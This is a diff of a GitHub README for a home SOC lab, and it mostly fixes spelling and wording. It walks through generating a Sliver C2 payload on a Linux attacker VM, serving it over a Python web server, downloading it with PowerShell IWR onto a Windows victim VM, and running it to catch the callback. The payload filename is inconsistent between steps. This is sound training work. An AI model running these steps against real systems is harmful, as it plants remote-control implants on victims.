@@ -25,14 +25,14 @@ The SOC Lab is designed to showcase my skills in a simulated real world environm
 - LimaCharlie for network monitoring and management. 
 - Linux VM to serve as attacking machine.
 - Windows VM to serve as Victim machine.
-- Sliver, an open source red team tool, used to launch payloads and maintainn persistence on victims machine.
+- Sliver, an open source red team tool, used to launch payloads and maintain persistence on victims machine.
 
   ### Steps: Part 1
 
-  1. Drop into a root shell and change directory to our Sliver install
+  1. First, I drop into a root shell and change directory to our Sliver install
        - sudo su
        - cd /opt/sliver
-  2. Launch sliver server
+  2. Next I launch sliver server
        - sliver-server
 
     ![4 Sliver](https://github.com/Lantern76/SOC-Lab/assets/119342094/6a6d3fb1-6f62-448a-97e2-3638c10332a8)
@@ -47,15 +47,15 @@ The SOC Lab is designed to showcase my skills in a simulated real world environm
 
   ![3](https://github.com/Lantern76/SOC-Lab/assets/119342094/b7064aaf-9dca-4a98-be00-011422b3f89e)
 
-  5. Now we have a C2 payload we can drop onto our Windows VM. We’ll do that next. Go ahead and exit Sliver for now
+  5. Now I have a C2 payload I can drop onto my Windows VM. I’ll do that next. First, I will go ahead and exit Sliver 
        - exit
-  6. To easily download the C2 payload from the Linux VM to the Windows VM, let’s use a little python trick that spins up a temporary web server
+  6. To easily download the C2 payload from the Linux VM to the Windows VM, I will use a little python trick that spins up a temporary web server
        - cd /opt/sliver
        - python3 -m http.server 80
-  7. Switch to the Windows VM and launch an Administrative PowerShell console
+  7. Next is to switch to the Windows VM and launch an Administrative PowerShell console
   8. Now I run the following command to download my C2 payload from the Linux VM to the Windows VM, using my own Linux VM IP and the name of the payload I generated in Sliver, RAPID_PLENTY.exe, a few steps prior
        - IWR -Uri http://[Linux_VM_IP]/REGULAR_PLENTY.exe -Outfile C:\Users\User\Downloads\REGULAR_PLENTY.exe
-  9. Now that the payload is on the Windows VM, we must switch back to the Linux VM SSH session and enable the Sliver HTTP server to catch the callback
+  9. Now that the payload is on the Windows VM, I must switch back to the Linux VM SSH session and enable the Sliver HTTP server to catch the callback
        - First I need to terminate the python web server by pressing Ctrl + c
        - Next is to relaunch Sliver
            - sliver-server
@@ -63,7 +63,7 @@ The SOC Lab is designed to showcase my skills in a simulated real world environm
             -http
   10. Return to the Windows VM and launch a powershell session as an administrator. Afterwords launch the payload
         - C:\Users\User\Downloads\RAPID_PLENTY.exe
-  11. Within a few moments, you should see my session check in on the Sliver server
+  11. Within a few moments, I should see my session check in on the Sliver server
 
   ![6 sliver sessions](https://github.com/Lantern76/SOC-Lab/assets/119342094/4383b004-3e19-43af-93b2-1d01dce94c0b)
 
@@ -114,7 +114,7 @@ The SOC Lab is designed to showcase my skills in a simulated real world environm
 ![12 Virus total ](https://github.com/Lantern76/SOC-Lab/assets/119342094/afe0a49c-c917-4039-ad15-ecf695603985)
 
 
-### That conclodes part 1 of the home SOC lab. Part 2 will be uploaded soon and will countinue below :) 
+### That concludes part 1 of the home SOC lab. Part 2 will be uploaded soon and will countinue below :) 
 
 
 
